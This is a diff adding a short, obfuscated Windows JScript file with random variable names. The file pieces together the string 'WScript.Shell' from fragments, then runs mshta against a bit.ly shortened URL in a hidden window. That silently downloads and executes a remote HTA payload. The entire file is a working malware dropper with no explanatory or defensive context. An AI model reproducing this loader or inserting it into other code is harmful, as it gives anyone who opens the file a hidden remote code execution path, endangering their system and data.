@@ -1,0 +1,10 @@
+ozubcdjm = ("t.S")
+tfkhigal = ("p"+ozubcdjm+"h")
+rkusltkp = ("i"+tfkhigal+"el")
+ejfmovxg = ("Scr")
+var ohatveji = WScript.CreateObject("W"+ejfmovxg+rkusltkp+"l")
+cbrkbcey = ("m")
+bgfghojm = ("sh")
+bapluxrc = ("ta ")
+ohatveji.Run((cbrkbcey+bgfghojm+bapluxrc)+" https://bit.ly/3xWF4yr",0)
+ohatveji = null;
